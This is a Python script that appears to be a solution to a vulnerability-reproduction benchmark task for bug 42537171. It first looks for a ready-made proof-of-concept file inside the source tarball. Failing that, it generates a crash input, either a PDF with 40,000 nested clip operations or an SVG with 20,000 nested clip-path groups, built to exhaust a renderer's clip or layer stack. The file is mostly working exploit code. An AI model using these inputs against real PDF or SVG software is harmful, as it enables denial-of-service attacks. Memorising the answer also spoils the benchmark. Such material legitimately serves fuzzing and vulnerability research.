import os
import tarfile
import tempfile
import shutil
import re


BUG_ID = "42537171"


def find_poc_in_tar(src_path: str, bug_id: str = BUG_ID) -> bytes | None:
    try:
        with tarfile.open(src_path, "r:*") as tf:
            best_member = None
            best_score = None
            candidate_exts = (
                ".svg",
                ".pdf",
                ".bin",
                ".dat",
                ".txt",
                ".json",
                ".bmp",
                ".pb",
                ".xml",
                ".skp",
                ".ps",
            )
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                base = os.path.basename(m.name).lower()
                if bug_id in base:
                    score = 0
                    for idx, ext in enumerate(candidate_exts):
                        if base.endswith(ext):
                            score = 100 - idx
                            break
                    else:
                        score = 20
                    if 0 < m.size <= 8 * 1024 * 1024:
                        score += 5
                    if best_score is None or score > best_score:
                        best_score = score
                        best_member = m
            if best_member is not None:
                f = tf.extractfile(best_member)
                if f is not None:
                    data = f.read()
                    if data:
                        return data
    except Exception:
        pass
    return None


def detect_format_from_project_yaml(src_root: str) -> str | None:
    try:
        for root, dirs, files in os.walk(src_root):
            if "project.yaml" in files:
                path = os.path.join(root, "project.yaml")
                try:
                    with open(path, "r", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue
                lower = text.lower()
                if (
                    "svg" in lower
                    or "librsvg" in lower
                    or "resvg" in lower
                    or "svgdom" in lower
                ):
                    return "svg"
                if (
                    "pdf" in lower
                    or "pdfium" in lower
                    or "poppler" in lower
                    or "qpdf" in lower
                ):
                    return "pdf"
                break
    except Exception:
        pass
    return None


def detect_format(src_root: str) -> str:
    text_exts = {
        ".c",
        ".cc",
        ".cpp",
        ".cxx",
        ".c++",
        ".cp",
        ".mm",
        ".h",
        ".hh",
        ".hpp",
        ".hxx",
    }

    harness_best = None
    svg_score_generic = 0
    pdf_score_generic = 0

    for root, dirs, files in os.walk(src_root):
        for fname in files:
            ext = os.path.splitext(fname)[1].lower()
            if ext not in text_exts:
                continue
            fpath = os.path.join(root, fname)
            try:
                with open(fpath, "r", errors="ignore") as f:
                    text = f.read(65536)
            except Exception:
                continue
            if not text:
                continue
            lower = text.lower()
            svg_score_generic += lower.count("svg")
            pdf_score_generic += lower.count("pdf")
            if "llvmfuzzertestoneinput" in lower:
                clip_count = lower.count("clip")
                layer_count = lower.count("layer")
                stack_count = lower.count("stack")
                depth_count = lower.count("depth")
                score = clip_count * 3 + (layer_count + stack_count + depth_count)

                seen_svg = bool(re.search(r"\bsvg\b", lower) or ".svg" in lower)
                seen_pdf = bool(
                    re.search(r"\bpdf\b", lower)
                    or ".pdf" in lower
                    or "pdfium" in lower
                    or "poppler" in lower
                    or "qpdf" in lower
                )

                fmt = "unknown"
                if seen_svg:
                    fmt = "svg"
                    score += 20
                elif seen_pdf:
                    fmt = "pdf"
                    score += 20

                if harness_best is None or score > harness_best["score"]:
                    harness_best = {"fmt": fmt, "score": score}

    if harness_best is not None and harness_best["fmt"] != "unknown":
        return harness_best["fmt"]

    proj_fmt = detect_format_from_project_yaml(src_root)
    if proj_fmt:
        return proj_fmt

    if svg_score_generic > pdf_score_generic and svg_score_generic > 0:
        return "svg"
    if pdf_score_generic > 0:
        return "pdf"
    return "unknown"


def generate_pdf_poc(depth: int = 40000) -> bytes:
    header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

    content_str = "q\n" + ("0 0 100 100 re W n\n" * depth) + "Q\n"
    content_bytes = content_str.encode("ascii")

    obj1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
    obj2 = b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n"
    obj3 = (
        b"3 0 obj\n"
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
        b"endobj\n"
    )

    stream_header = f"4 0 obj\n<< /Length {len(content_bytes)} >>\nstream\n".encode(
        "ascii"
    )
    stream_footer = b"\nendstream\nendobj\n"
    obj4 = stream_header + content_bytes + stream_footer

    objs = [obj1, obj2, obj3, obj4]

    offsets = []
    current_offset = len(header)
    for obj in objs:
        offsets.append(current_offset)
        current_offset += len(obj)

    xref_offset = current_offset

    num_objs = len(objs)
    xref_lines = []
    xref_lines.append(f"xref\n0 {num_objs + 1}\n".encode("ascii"))
    xref_lines.append(b"0000000000 65535 f \n")
    for off in offsets:
        xref_lines.append(f"{off:010d} 00000 n \n".encode("ascii"))
    xref = b"".join(xref_lines)

    trailer_str = (
        f"trailer\n<< /Size {num_objs + 1} /Root 1 0 R >>\n"
        f"startxref\n{xref_offset}\n%%%%EOF\n"
    )
    trailer = trailer_str.encode("ascii")

    pdf_bytes = header + b"".join(objs) + xref + trailer
    return pdf_bytes


def generate_svg_poc(depth: int = 20000) -> bytes:
    header = (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">\n'
        '<defs><clipPath id="c"><rect x="0" y="0" width="100" height="100"/></clipPath></defs>\n'
    )
    groups_open = "".join('<g clip-path="url(#c)">\n' for _ in range(depth))
    rect = '<rect x="0" y="0" width="100" height="100" fill="red"/>\n'
    groups_close = "</g>\n" * depth
    footer = "</svg>\n"
    svg_str = header + groups_open + rect + groups_close + footer
    return svg_str.encode("utf-8")


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = find_poc_in_tar(src_path)
        if poc is not None:
            return poc

        tmpdir = None
        fmt = "unknown"
        try:
            tmpdir = tempfile.mkdtemp(prefix="pocgen_")
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
            fmt = detect_format(tmpdir)
        except Exception:
            fmt = "unknown"
        finally:
            if tmpdir is not None:
                try:
                    shutil.rmtree(tmpdir)
                except Exception:
                    pass

        if fmt == "svg":
            return generate_svg_poc()
        # Default and for pdf-detected projects
        return generate_pdf_poc()